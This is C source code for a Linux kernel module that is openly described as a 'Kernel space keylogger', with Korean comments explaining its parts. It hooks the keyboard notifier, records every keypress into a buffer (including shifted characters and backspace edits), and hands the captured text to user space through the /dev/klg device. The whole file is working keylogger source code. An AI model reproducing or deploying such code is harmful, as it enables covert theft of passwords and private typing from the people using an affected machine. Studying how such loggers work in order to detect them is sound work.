/* Necessary includes for device drivers */
#include <linux/kernel.h>
#include <asm/uaccess.h>

#include "klogger.h"

static int shiftkey_On = 0;

int klg_init(void) {
	int result;

	/* Registering device */
  	result = register_chrdev(KLG_MAJOR, "klg", &klg_fops);
  
	if (result < 0)
		return result;

	register_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);

	printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 

	return 0;
}

void klg_exit(void) {
	/* Freeing the major number */
	unregister_chrdev(KLG_MAJOR, "klg");

	unregister_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);
	bptr = buffer;

	printk(KERN_DEBUG "[Key logger]: Removing klg module\n");

}

// 참조 http://www.makelinux.net/ldd3/images/0596005903/figs/ldr3_0302.gif
int klg_open(struct inode *inode, struct file *filp) {	// kernel 프로그래밍 시 필요한 .open 에 할당될 함수로 로그만 남기고 아무것도 안함

	printk(KERN_DEBUG "[Key logger]: Opening device\n");	// 커널 로그 남김
	return 0;
}

ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { // kernel 프로그래밍 시 필요한 .read 에 할당 될 함수

	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");	// 커널 로그 생성

	char* p = buffer;
	int bytes = 0;

	while(*p != '\0') {	// 버퍼 크기 조사하는 함수로 보임
		bytes++;
		p++;
	}

	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);	// 커널 로그 생성

	if(bytes == 0 || *f_pos) return 0;	// 버퍼 크기가 0일 경우 0 반환

	int ret = copy_to_user(buf, buffer, bytes);	// buf 유저에게 buffer 를 bytes 값만큼 보냄

	if(ret) {	// 실패시
		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");	// 로그 찍기
		return -EFAULT;	// #define EFAULT  14  /* Bad address */   from error.h
	}

	*f_pos = 1;

	return bytes;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
	struct keyboard_notifier_param *param = _param;

	if (code == KBD_KEYCODE)
	{
		if (param->value == 42 || param->value == 54)
		{
			if(param->down) shiftkey_On = 1;
			else shiftkey_On = 0;
			return NOTIFY_OK;
		}
		if (param->down)
		{
			if (param->value == KEY_BACKSPACE)
			{
				if (bptr != buffer) {
					--bptr;
					*bptr = '\0';
				}
			}
			else 
			{
				char ch;
				if (shiftkey_On == 0)
					ch = get_ascii(param->value);
				else
					ch = shifted_get_ascii(param->value);
				if (ch != 'X') {
					*bptr = ch;
					bptr++;
					if (bptr == endptr) bptr = buffer;
				}
			}
		}
	}
	return NOTIFY_OK;
}

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Aisha Nair");   
MODULE_DESCRIPTION("Kernel space keylogger");  
MODULE_VERSION("2.0"); 

module_init(klg_init);
module_exit(klg_exit);

